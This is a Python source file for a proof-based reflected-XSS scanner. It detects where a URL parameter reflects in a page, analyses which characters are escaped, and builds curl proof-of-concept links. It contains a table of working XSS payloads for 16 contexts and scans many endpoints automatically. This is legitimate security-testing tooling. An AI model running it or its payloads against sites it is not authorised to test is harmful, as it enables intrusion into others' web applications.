"""
BugScan ELITE — Proof-Based XSS Scanner
Inspired by Lonkero v3.6 approach: mathematical proof of exploitability.

No browser required. 2-3 requests per parameter.
16 reflection contexts. Escape behavior analysis.
Context + Escaping = Exploitability PROOF.
"""
import re, time, urllib.parse, hashlib
from typing import Dict, List, Optional, Tuple

# ── 16 Reflection Contexts ────────────────────────────────────────────────────
CTX_HTML_BODY       = "html_body"         # <p>USER_INPUT</p>
CTX_HTML_ATTR_DQ    = "html_attr_dq"      # <input value="USER_INPUT">
CTX_HTML_ATTR_SQ    = "html_attr_sq"      # <input value='USER_INPUT'>
CTX_HTML_ATTR_BARE  = "html_attr_bare"    # <input value=USER_INPUT>
CTX_JS_STRING_DQ    = "js_string_dq"      # var x = "USER_INPUT";
CTX_JS_STRING_SQ    = "js_string_sq"      # var x = 'USER_INPUT';
CTX_JS_STRING_BT    = "js_string_bt"      # var x = `USER_INPUT`;
CTX_JS_BLOCK        = "js_block"          # <script>USER_INPUT</script>
CTX_EVENT_HANDLER   = "event_handler"     # <div onmouseover="USER_INPUT">
CTX_URL_ATTR        = "url_attr"          # <a href="USER_INPUT">
CTX_CSS_VALUE       = "css_value"         # style="color: USER_INPUT"
CTX_HTML_COMMENT    = "html_comment"      # <!-- USER_INPUT -->
CTX_TEMPLATE        = "template"          # {{USER_INPUT}} or ${USER_INPUT}
CTX_JSON_VALUE      = "json_value"        # {"key": "USER_INPUT"}
CTX_META_CONTENT    = "meta_content"      # <meta content="USER_INPUT">
CTX_DATA_ATTR       = "data_attr"         # data-value="USER_INPUT"

# Exploitable contexts and their working payloads
_CONTEXT_PAYLOADS: Dict[str, str] = {
    CTX_HTML_BODY:      '<img src=x onerror=alert(1)>',
    CTX_HTML_ATTR_DQ:   '" onfocus=alert(1) autofocus="',
    CTX_HTML_ATTR_SQ:   "' onfocus=alert(1) autofocus='",
    CTX_HTML_ATTR_BARE: ' onfocus=alert(1) autofocus ',
    CTX_JS_STRING_DQ:   '";alert(1)//',
    CTX_JS_STRING_SQ:   "';alert(1)//",
    CTX_JS_STRING_BT:   '`+alert(1)+`',
    CTX_JS_BLOCK:       'alert(1)',
    CTX_EVENT_HANDLER:  'alert(1)',
    CTX_URL_ATTR:       'javascript:alert(1)',
    CTX_CSS_VALUE:      'expression(alert(1))',
    CTX_HTML_COMMENT:   '--><img src=x onerror=alert(1)><!--',
    CTX_TEMPLATE:       '${alert(1)}',
    CTX_JSON_VALUE:     '","evil":"<img src=x onerror=alert(1)>',
    CTX_META_CONTENT:   ';URL=javascript:alert(1)',
    CTX_DATA_ATTR:      '" onmouseover=alert(1) "',
}

# Severity by context
_CONTEXT_SEVERITY: Dict[str, str] = {
    CTX_HTML_BODY:     "high",
    CTX_HTML_ATTR_DQ:  "high",
    CTX_HTML_ATTR_SQ:  "high",
    CTX_HTML_ATTR_BARE:"high",
    CTX_JS_STRING_DQ:  "high",
    CTX_JS_STRING_SQ:  "high",
    CTX_JS_STRING_BT:  "high",
    CTX_JS_BLOCK:      "critical",
    CTX_EVENT_HANDLER: "high",
    CTX_URL_ATTR:      "high",
    CTX_CSS_VALUE:     "medium",
    CTX_HTML_COMMENT:  "medium",
    CTX_TEMPLATE:      "high",
    CTX_JSON_VALUE:    "medium",
    CTX_META_CONTENT:  "medium",
    CTX_DATA_ATTR:     "medium",
}


def detect_reflection_context(canary: str, html: str) -> List[str]:
    """
    Given a canary value and the HTML response, detect which contexts
    the canary appears in. Returns list of CTX_* constants.
    """
    contexts = []
    if canary not in html:
        return contexts
    
    # Find all positions of canary
    positions = [m.start() for m in re.finditer(re.escape(canary), html)]
    
    for pos in positions:
        # Get surrounding context (300 chars before + after)
        before = html[max(0, pos-300):pos]
        after  = html[pos:pos+300]
        ctx    = before + canary + after
        
        # Script block context
        if re.search(r'<script[^>]*>(?:[^<]|<(?!/script))*$', before, re.I | re.S):
            # Inside JS — what kind of string?
            js_before = before
            if re.search(r'=\s*"[^"]*$', js_before): contexts.append(CTX_JS_STRING_DQ)
            elif re.search(r"=\s*'[^']*$", js_before): contexts.append(CTX_JS_STRING_SQ)
            elif re.search(r'=\s*`[^`]*$', js_before): contexts.append(CTX_JS_STRING_BT)
            else: contexts.append(CTX_JS_BLOCK)
            continue
        
        # HTML comment
        if re.search(r'<!--(?:[^-]|-(?!->))*$', before, re.S):
            contexts.append(CTX_HTML_COMMENT)
            continue
        
        # Inside a tag
        tag_match = re.search(r'<(\w+)(?:[^>]*)$', before, re.S)
        if tag_match:
            tag_name   = tag_match.group(1).lower()
            attr_before = before[tag_match.start():]
            
            # Event handler attribute
            if re.search(r'\s+on\w+\s*=\s*(?:"[^"]*|\'[^\']*|[^"\']\S*)$', attr_before, re.I):
                contexts.append(CTX_EVENT_HANDLER)
                continue
            
            # href/src attribute (URL context)
            if re.search(r'\s+(?:href|src|action|data)\s*=\s*(?:"[^"]*|\'[^\']*|)$', attr_before, re.I):
                contexts.append(CTX_URL_ATTR)
                continue
            
            # Style attribute
            if re.search(r'\s+style\s*=\s*(?:"[^"]*|\'[^\']*|)$', attr_before, re.I):
                contexts.append(CTX_CSS_VALUE)
                continue
            
            # Meta content
            if tag_name == 'meta' and re.search(r'\s+content\s*=\s*(?:"[^"]*|\'[^\']*|)$', attr_before, re.I):
                contexts.append(CTX_META_CONTENT)
                continue
            
            # Data attribute
            if re.search(r'\s+data-\w+\s*=\s*(?:"[^"]*|\'[^\']*|)$', attr_before, re.I):
                contexts.append(CTX_DATA_ATTR)
                continue
            
            # Regular attribute
            if re.search(r'\s+\w+\s*=\s*"[^"]*$', attr_before):
                contexts.append(CTX_HTML_ATTR_DQ)
            elif re.search(r"\s+\w+\s*=\s*'[^']*$", attr_before):
                contexts.append(CTX_HTML_ATTR_SQ)
            else:
                contexts.append(CTX_HTML_ATTR_BARE)
            continue
        
        # Template syntax
        if re.search(r'\{\{[^}]*$', before) or re.search(r'\$\{[^}]*$', before):
            contexts.append(CTX_TEMPLATE)
            continue
        
        # JSON value
        if re.search(r':\s*"[^"]*$', before) or (before.count('{') > before.count('}')):
            if before.strip().endswith('"') or re.search(r':\s*"[^"]*$', before):
                contexts.append(CTX_JSON_VALUE)
                continue
        
        # Default: HTML body
        contexts.append(CTX_HTML_BODY)
    
    return list(set(contexts))  # deduplicate


def analyze_escape_behavior(canary: str, probe_str: str, html: str) -> Dict[str, bool]:
    """
    Analyze what characters are escaped/stripped in the response.
    probe_str contains special chars we injected alongside the canary.
    """
    # Extract the part of the response where our probe appears
    pos = html.find(canary[:8])  # find by prefix
    if pos < 0:
        return {}
    
    ctx_window = html[max(0,pos-50):pos+200]
    
    escaped = {}
    for char, check in [
        ('<',  '&lt;'),
        ('>',  '&gt;'),
        ('"',  '&quot;'),
        ("'",  '&#39;'),
        ('/',  '&#x2F;'),
        ('`',  '&#x60;'),
        ('{',  '&#123;'),
    ]:
        # Character is escaped if HTML entity appears but raw char doesn't in same position
        escaped[char] = (check in ctx_window) and (char not in ctx_window.replace(check, ''))
    
    return escaped


def is_exploitable(context: str, escaped_chars: Dict[str, bool]) -> Tuple[bool, str]:
    """
    Given context and which chars are escaped, determine if XSS is exploitable.
    Returns (exploitable: bool, reason: str)
    """
    if context == CTX_HTML_BODY:
        # Need < and > unescaped, OR onerror via img
        if not escaped_chars.get('<') and not escaped_chars.get('>'):
            return True, "< > unescaped in HTML body → tag injection possible"
        return False, "HTML entities applied to < > — blocked"
    
    elif context in (CTX_HTML_ATTR_DQ,):
        if not escaped_chars.get('"'):
            return True, '\" unescaped in attribute → can break out and inject event handler'
        return False, '" escaped — attribute escape applied'
    
    elif context in (CTX_HTML_ATTR_SQ,):
        if not escaped_chars.get("'"):
            return True, "' unescaped in attribute → can break out and inject event handler"
        return False, "' escaped — attribute escape applied"
    
    elif context in (CTX_JS_STRING_DQ,):
        if not escaped_chars.get('"') and not escaped_chars.get('\\'):
            return True, '" unescaped in JS string → can escape string and inject code'
        return False, '" escaped in JS string — safe'
    
    elif context in (CTX_JS_STRING_SQ,):
        if not escaped_chars.get("'"):
            return True, "' unescaped in JS string → can escape and inject code"
        return False, "' escaped in JS string — safe"
    
    elif context == CTX_JS_BLOCK:
        return True, "Reflected directly inside <script> block — always exploitable"
    
    elif context == CTX_EVENT_HANDLER:
        return True, "Reflected inside event handler — already in execution context"
    
    elif context == CTX_URL_ATTR:
        return True, "Reflected in URL attribute — javascript: scheme possible"
    
    elif context == CTX_TEMPLATE:
        # Check if template syntax is processed
        return True, "Template context — ${} or {{}} injection possible"
    
    elif context == CTX_HTML_COMMENT:
        if not escaped_chars.get('-') and not escaped_chars.get('>'):
            return True, "Can break out of HTML comment with --> injection"
        return False, "Comment escape filtered"
    
    return False, f"Context {context} — requires manual verification"


def proof_based_xss_scan(url: str, param: str, get_fn) -> Optional[Dict]:
    """
    Proof-based XSS test for a single parameter.
    
    REQUEST 1: Baseline — just the canary
    REQUEST 2: Probe — canary + special characters
    ANALYSIS: Context detection + escape analysis = exploitability proof
    
    Returns finding dict if exploitable, None if not.
    """
    # Generate unique canary (16 chars, alphanumeric only — won't be misread)
    canary = "bsxss" + hashlib.md5(f"{url}{param}{time.time()}".encode()).hexdigest()[:8]
    probe_chars = "\"'<>/`${}"
    probe = canary + probe_chars
    
    try:
        # ── REQUEST 1: Canary only ────────────────────────────────────────────
        r1 = get_fn(url, {param: canary}, timeout=8)
        if not r1:
            return None
        
        body1 = r1[2] if len(r1) > 2 else ""
        if canary not in body1:
            return None  # No reflection at all
        
        # Detect context from baseline reflection
        contexts = detect_reflection_context(canary, body1)
        if not contexts:
            return None
        
        # ── REQUEST 2: Probe with special chars ───────────────────────────────
        r2 = get_fn(url, {param: probe}, timeout=8)
        body2 = r2[2] if r2 and len(r2) > 2 else ""
        
        # Analyze escaping behavior
        escaped = analyze_escape_behavior(canary, probe_chars, body2 or body1)
        
        # ── ANALYSIS: Context + Escaping = Proof ─────────────────────────────
        for ctx in contexts:
            exploitable, reason = is_exploitable(ctx, escaped)
            if exploitable:
                payload = _CONTEXT_PAYLOADS.get(ctx, '<script>alert(1)</script>')
                severity = _CONTEXT_SEVERITY.get(ctx, "high")
                
                # Build proof-based curl PoC
                encoded_payload = urllib.parse.quote(payload)
                poc = (
                    f"# Proof-Based XSS — Context: {ctx}\n"
                    f"# Step 1: Canary baseline (reflection confirmed)\n"
                    f"curl -sk '{url}?{param}={canary}' | grep {canary}\n\n"
                    f"# Step 2: Exploit — context-specific payload\n"
                    f"curl -sk '{url}?{param}={encoded_payload}'"
                )
                
                return {
                    "bug":         "xss",
                    "severity":    severity,
                    "url":         f"{url}?{param}={encoded_payload}",
                    "param":       param,
                    "title":       f"Proof-Based XSS ({ctx}) — {reason[:60]}",
                    "description": (
                        f"Reflected XSS confirmed via mathematical context analysis.\n"
                        f"Reflection context: {ctx}\n"
                        f"Exploitability proof: {reason}\n"
                        f"Escaped chars: {[k for k,v in escaped.items() if v]}\n"
                        f"Unescaped chars: {[k for k,v in escaped.items() if not v]}\n"
                        f"Payload: {payload}"
                    ),
                    "poc":         poc,
                    "confidence":  92,
                    "details": {
                        "reflection_context": ctx,
                        "escape_analysis":    escaped,
                        "exploitability":     reason,
                        "canary":             canary,
                        "payload":            payload,
                        "reflection_detected": True,
                    },
                    "reflected":   True,
                    "_proof_method": "context_analysis",
                }
        
        return None  # Reflected but all contexts protected
    
    except Exception:
        return None


def check_xss_proof_based(endpoints: List[str], get_fn=None) -> List[Dict]:
    """
    Run proof-based XSS on a list of endpoints.
    Only tests endpoints with parameters. Uses context + escape analysis.
    Skips: CSRF tokens, session IDs, pagination, boolean flags.
    """
    if not get_fn:
        try:
            from scanner import _get as get_fn
        except Exception:
            return []
    
    SKIP_PARAMS = {
        'csrf', 'csrf_token', '_token', 'authenticity_token', 'nonce',
        'state', 'code', 'oauth_token', 'access_token', 'refresh_token',
        'page', 'per_page', 'limit', 'offset', 'cursor', 'start', 'count',
        'sort', 'order', 'direction', 'asc', 'desc',
        'lang', 'locale', 'tz', 'timezone',
        'format', 'type', 'version', 'v',
        'callback', 'jsonp',
        'debug', 'test', 'preview',
    }
    
    findings = []
    tested   = set()
    
    for ep in endpoints[:400]:
        if '=' not in ep:
            continue
        try:
            parsed = urllib.parse.urlparse(ep)
            if not parsed.netloc:
                continue
            base   = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
            
            for param in params:
                param_lower = param.lower()
                
                # Skip non-injectable params
                if param_lower in SKIP_PARAMS:
                    continue
                if any(param_lower.endswith(s) for s in ('_id', '_at', '_by', 'time', 'stamp')):
                    if not any(k in param_lower for k in ('search', 'query', 'name', 'title', 'desc', 'label')):
                        pass  # numeric IDs can be reflected in HTML
                
                key = (base, param)
                if key in tested:
                    continue
                tested.add(key)
                
                result = proof_based_xss_scan(base, param, get_fn)
                if result:
                    findings.append(result)
                    if len(findings) >= 5:  # limit per call
                        return findings
        
        except Exception:
            continue
    
    return findings
